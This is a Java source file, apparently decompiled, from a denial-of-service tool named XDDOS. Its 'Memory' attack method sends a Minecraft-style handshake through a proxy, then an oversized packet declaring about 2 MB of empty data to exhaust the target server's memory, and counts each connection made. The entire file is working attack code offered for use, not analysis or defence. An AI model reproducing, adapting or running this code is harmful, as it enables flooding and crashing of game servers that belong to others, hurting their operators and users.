package XD.XDDOS.methods.impl;

import XD.XDDOS.XDDOS;
import XD.XDDOS.methods.IMethod;
import XD.XDDOS.utils.NettyBootstrap;
import XD.XDDOS.utils.packet.Handshake;
import XD.XDDOS.utils.proxy.ProxyLoader;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import java.io.IOException;




public class Memory
  implements IMethod
{
  private Handshake handshake = new Handshake(XDDOS.protcolID, XDDOS.srvRecord, XDDOS.port, 2);
  private byte[] bytes = this.handshake.getWrappedPacket();
  byte[] emptyarray = new byte[2097150];


  public static void writeVarInt(ByteBufOutputStream out, int paramInt) throws IOException {
    while ((paramInt & 0xFFFFFF80) != 0) {
      out.writeByte(paramInt & 0x7F | 0x80);
      paramInt >>>= 7;
    }

    out.writeByte(paramInt);
  }

  public void accept(Channel channel, ProxyLoader.Proxy proxy) {
    channel.write(Unpooled.buffer().writeBytes(this.bytes));
    ByteBuf b = Unpooled.buffer();
    ByteBufOutputStream out = new ByteBufOutputStream(b);

    try {
      writeVarInt(out, 2097151);
      out.write(this.emptyarray);
      out.close();
    } catch (IOException var6) {
      var6.printStackTrace();
    }

    channel.writeAndFlush(b);
    NettyBootstrap.integer++;
    NettyBootstrap.totalConnections++;
    channel.close();
  }
}
